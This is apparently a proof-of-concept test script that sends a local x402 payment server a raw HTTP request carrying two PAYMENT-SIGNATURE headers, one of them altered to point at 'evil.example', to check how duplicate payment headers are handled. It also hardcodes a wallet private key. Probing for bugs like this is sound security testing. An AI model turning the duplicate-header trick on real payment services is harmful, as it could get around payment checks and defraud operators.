import net from "node:net";
import { x402HTTPClient } from "@x402/core/http";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";
const a = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
const c = new x402Client(); c.register("eip155:*", new ExactEvmScheme(a));
const hc = new x402HTTPClient(c);
const ch = await fetch("http://127.0.0.1:4198/api/cheap"); const b = await ch.json();
const pr = hc.getPaymentRequiredResponse(n => ch.headers.get(n), b);
const p1 = await hc.createPaymentPayload(pr);
const H1 = Object.values(hc.encodePaymentSignatureHeader(p1))[0];
const p2 = await hc.createPaymentPayload(pr);
p2.resource = { url: "http://evil.example/x", description: "second header", mimeType: "" };
const H2 = Object.values(hc.encodePaymentSignatureHeader(p2))[0];

async function raw(doubled) {
  return new Promise(resolve => {
    const s = net.connect(4198, "127.0.0.1", () => {
      const hdrs = [`GET /api/cheap HTTP/1.1`, `Host: 127.0.0.1:4198`, `Connection: close`];
      if (doubled) { hdrs.push(`PAYMENT-SIGNATURE: ${H1}`, `PAYMENT-SIGNATURE: ${H2}`); }
      else { hdrs.push(`PAYMENT-SIGNATURE: ${H1}`); }
      s.write(hdrs.join("\r\n") + "\r\n\r\n");
    });
    let out = "";
    s.on("data", d => (out += d));
    s.on("end", () => resolve(out.split("\r\n\r\n")[0].split("\r\n")[0] + " | body=" + out.split("\r\n\r\n").slice(1).join("").slice(0, 60)));
  });
}
console.log("single PAYMENT-SIGNATURE  :", await raw(false));
console.log("DUPLICATE PAYMENT-SIGNATURE:", await raw(true));
